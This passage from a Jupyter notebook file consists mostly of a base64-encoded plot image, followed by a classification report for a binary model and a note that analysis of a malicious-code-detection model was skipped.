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\n"
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "Classification Report for model_final:\n",
            "              precision    recall  f1-score   support\n",
            "\n",
            "           0       1.00      0.94      0.97       110\n",
            "           1       0.97      1.00      0.98       201\n",
            "\n",
            "    accuracy                           0.98       311\n",
            "   macro avg       0.98      0.97      0.98       311\n",
            "weighted avg       0.98      0.98      0.98       311\n",
            "\n",
            "\n",
            "--- Confusion Matrix for model_mal (Malicious Code Detection) ---\n",
            "Required variables (model_mal, test data, label_encoder_mal) for model_mal analysis not found. Skipping.\n"
          ]
        }
      ]
    }
  ]
}